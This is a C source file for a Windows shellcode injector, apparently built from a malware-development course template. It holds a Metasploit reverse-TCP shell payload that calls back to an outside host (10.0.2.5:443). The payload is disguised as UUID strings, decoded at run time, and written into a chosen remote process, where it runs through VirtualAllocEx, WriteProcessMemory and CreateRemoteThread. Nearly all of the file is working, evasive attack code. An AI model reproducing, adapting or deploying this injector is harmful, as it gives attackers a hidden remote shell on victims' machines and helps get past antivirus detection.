// Original Code Template Authors - @NUL0x4C | @mrd0x : MalDevAcademy
// Code modified by - chrollo.dll aka @Chrollo_l33t

#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

// Payload - msfvenom -p windows/x64/shell_reverse_tcp lhost=10.0.2.5 lport=443 EXITFUNC=thread -f raw -o rev.bin

char* uuid_payload[] = {
		"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
		"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
		"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
		"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
		"8B485A59-E912-FF57-FFFF-5D49BE777332", "0032335F-4100-4956-89E6-4881ECA00100", "E5894900-BC49-0002-01BB-0A0002054154",
		"4CE48949-F189-BA41-4C77-2607FFD54C89", "010168EA-0000-4159-BA29-806B00FFD550", "C9314D50-314D-48C0-FFC0-4889C248FFC0",
		"41C18948-EABA-DF0F-E0FF-D54889C76A10", "894C5841-48E2-F989-41BA-99A57461FFD5", "40C48148-0002-4900-B863-6D6400000000",
		"41504100-4850-E289-5757-574D31C06A0D", "E2504159-66FC-44C7-2454-0101488D4424", "6800C618-8948-56E6-5041-504150415049",
		"5041C0FF-FF49-4DC8-89C1-4C89C141BA79", "FF863FCC-48D5-D231-48FF-CA8B0E41BA08", "FF601D87-BBD5-1DE0-2A0A-41BAA695BD9D",
		"8348D5FF-28C4-063C-7C0A-80FBE07505BB", "6F721347-006A-4159-89DA-FFD590909090"
};

#define NumberOfElements 29


typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
	);

BOOL UuidDeobfuscation(IN CHAR* uuid_payload[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE          pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T         sBuffSize = NULL;

	RPC_STATUS     STATUS = NULL;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		//printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		//printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in uuid_payload
	for (int i = 0; i < NmbrOfElements; i++) {

		if ((STATUS = pUuidFromStringA((RPC_CSTR)uuid_payload[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			//printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", uuid_payload[i], STATUS);
			return FALSE;
		}
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;
}


// Gets the process handle of a process of name szProcessName
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 Proc = {.dwSize = sizeof(PROCESSENTRY32) };

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		//printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		//printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
			// in LowerName to do the wcscmp call later

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// Compare the enumerated process path with what is passed
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the process ID 
			*dwProcessId	= Proc.th32ProcessID;
			// Open a process handle and return
			*hProcess		= OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				//printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// while there is still a valid output ftom Process32Next, continue looping
	} while (Process32Next(hSnapShot, &Proc));
	
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID pShellcodeAddress	= NULL;
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		return FALSE;
	}

	// Writing the shellcode to the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {

		return FALSE;
	}

	// Cleaning the buffer of the shellcode in the local process
	memset(pShellcode, '\0', sSizeOfShellcode);

	// Setting memory permossions at pShellcodeAddress to be executable 
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		return FALSE;
	}

	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		return FALSE;
	}
	printf("[+] INJECTED!!\n");

	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;

	PBYTE pDeobfuscatedPayload = NULL;
	SIZE_T sDeobfuscatedSize = NULL;

	// Checking command line arguments
	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}
	// Getting a handle to the process
	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		//printf("[!] Process is Not Found \n");
		return -1;
	}

	if (!UuidDeobfuscation(uuid_payload, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		return -1;
	}

	// Injecting the shellcode
	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		return -1;
	}

	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	CloseHandle(hProcess);
	
	return 0;
}



